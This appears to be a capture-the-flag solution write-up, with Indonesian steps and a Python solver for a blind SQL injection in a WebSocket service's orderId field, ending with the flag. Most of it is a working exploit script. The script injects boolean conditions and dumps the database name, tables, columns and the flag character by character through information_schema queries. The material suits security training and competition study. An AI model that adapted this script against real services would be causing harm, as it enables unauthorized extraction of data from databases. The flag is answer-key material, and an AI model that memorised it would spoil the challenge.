** Solution Walkthrough **

Vulnerability : Websocket Blind SQL Injection

1. Pada saat user mengirim request, terdapat request berupa websocket yang terkirim
2. User dapat mengintercept atau melihat request tersebut menggunakan burpsuite
3. Parameter "orderId dan email" merupakan 2 parameter yang vulnerable terhadap blind SQL Injection
4. User dapat melakukan dump database secara manual atau menggunakan automation script.

solver.py
```
import websocket
import json
import string

WS_URL = "ws://localhost:8003/ws"

CHARSET = string.ascii_letters + string.digits + "_{}-:@!$"
MAX_LEN = 64

def send_payload(order_id):
    ws = websocket.create_connection(WS_URL)
    payload = {
        "type": "verify",
        "orderId": order_id,
        "email": ""
    }
    ws.send(json.dumps(payload))

    ws.recv()

    response = ws.recv()
    ws.close()
    return response


def is_true(condition):
    payload = f"asd' OR ({condition})-- -"
    resp = send_payload(payload)
    return '"ok":true' in resp

def extract_string(sql):
    result = ""
    for i in range(1, MAX_LEN + 1):
        found = False
        for c in CHARSET:
            cond = f"ASCII(SUBSTRING(({sql}),{i},1))={ord(c)}"
            if is_true(cond):
                result += c
                print(f"[+] {result}")
                found = True
                break
        if not found:
            break
    return result

def get_database():
    print("[*] Extracting database name")
    return extract_string("DATABASE()")

def get_tables(db):
    tables = []
    print("[*] Enumerating tables")
    for i in range(0, 20):
        name = extract_string(
            f"SELECT table_name FROM information_schema.tables "
            f"WHERE table_schema='{db}' LIMIT 1 OFFSET {i}"
        )
        if not name:
            break
        tables.append(name)
        print(f"[TABLE] {name}")
    return tables

def get_columns(db, table):
    columns = []
    print(f"[*] Enumerating columns for {table}")
    for i in range(0, 20):
        col = extract_string(
            f"SELECT column_name FROM information_schema.columns "
            f"WHERE table_schema='{db}' AND table_name='{table}' "
            f"LIMIT 1 OFFSET {i}"
        )
        if not col:
            break
        columns.append(col)
        print(f"[COLUMN] {col}")
    return columns

def dump_flag(table, column):
    print(f"[🏁] Dumping flag from {table}.{column}")
    return extract_string(f"SELECT {column} FROM {table} LIMIT 1")

if __name__ == "__main__":
    db = get_database()
    print(f"\n[DB] {db}\n")

    tables = get_tables(db)

    for table in tables:
        cols = get_columns(db, table)
        for col in cols:
            if "flag" in col.lower():
                flag = dump_flag(table, col)
                print(f"\n FLAG FOUND: {flag}")
                exit()
```

** Flag : LKSWNSB{SqLI_TT4Api1_BbutT44444} **